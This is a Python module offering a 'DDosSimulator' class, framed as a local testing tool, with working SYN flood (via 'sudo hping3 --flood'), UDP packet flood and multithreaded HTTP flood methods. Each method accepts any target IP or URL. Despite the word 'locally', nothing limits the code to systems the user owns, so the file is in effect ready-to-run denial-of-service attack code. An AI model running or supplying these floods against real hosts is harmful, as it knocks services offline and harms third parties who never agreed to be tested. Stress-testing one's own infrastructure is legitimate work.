"""
DDoS Attack Simulation Tools for Testing
"""
import logging
import subprocess
import platform
from typing import Literal
import time

logger = logging.getLogger(__name__)


class DDosSimulator:
    """Simulate various DDoS attacks locally"""
    
    @staticmethod
    def syn_flood(target_ip: str, target_port: int = 80, duration: int = 10):
        """
        SYN flood attack using hping3
        Requires: sudo apt-get install hping3
        """
        logger.info(f"🚀 Starting SYN flood: {target_ip}:{target_port} for {duration}s")
        
        cmd = [
            'sudo', 'hping3',
            '-S',  # SYN flag
            '-p', str(target_port),
            '--flood',  # Send packets as fast as possible
            target_ip
        ]
        
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
            time.sleep(duration)
            process.terminate()
            logger.info("✅ SYN flood completed")
        except Exception as e:
            logger.error(f"SYN flood failed: {e}")
    
    @staticmethod
    def udp_flood(target_ip: str, target_port: int = 53, duration: int = 10, packet_size: int = 100):
        """
        UDP flood attack
        Requires: Python3
        """
        logger.info(f"🚀 Starting UDP flood: {target_ip}:{target_port} for {duration}s")
        
        script = f"""
import socket
import time
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
end_time = time.time() + {duration}
while time.time() < end_time:
    data = b'X' * {packet_size}
    try:
        sock.sendto(data, ('{target_ip}', {target_port}))
    except:
        pass
sock.close()
"""
        
        try:
            subprocess.run(['python3', '-c', script], timeout=duration+5)
            logger.info("✅ UDP flood completed")
        except Exception as e:
            logger.error(f"UDP flood failed: {e}")
    
    @staticmethod
    def http_flood(target_url: str, duration: int = 10, threads: int = 5):
        """
        HTTP flood attack
        Requires: requests library
        """
        logger.info(f"🚀 Starting HTTP flood: {target_url} for {duration}s with {threads} threads")
        
        script = f"""
import requests
import threading
import time

def flood():
    end_time = time.time() + {duration}
    while time.time() < end_time:
        try:
            requests.get('{target_url}', timeout=1)
        except:
            pass

threads = []
for _ in range({threads}):
    t = threading.Thread(target=flood, daemon=True)
    t.start()
    threads.append(t)

for t in threads:
    t.join()
"""
        
        try:
            subprocess.run(['python3', '-c', script], timeout=duration+10)
            logger.info("✅ HTTP flood completed")
        except Exception as e:
            logger.error(f"HTTP flood failed: {e}")
